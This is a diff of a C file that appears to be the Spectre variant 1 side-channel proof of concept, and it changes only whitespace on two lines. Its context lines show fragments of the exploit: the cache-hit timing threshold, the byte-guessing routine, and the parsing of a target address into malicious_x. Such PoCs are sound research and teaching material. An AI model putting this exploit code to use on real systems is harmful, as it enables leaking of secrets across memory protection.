@@ -33,7 +33,7 @@ void victim_function(size_t x) {
  ********************************************************************/
  #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
-/* Report best guess in value[0] and runner-up in value[1] */
+ /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i;
@@ -104,7 +104,7 @@ int main(int argc, const char **argv) {
   uint8_t value[2];
 
   for (i = 0; i < sizeof(array2); i++)
-    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+   array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   if (argc == 3) {
     sscanf(argv[1], "%p", (void**)(&malicious_x));
     malicious_x -= (size_t)array1; /* Convert input value into a pointer */
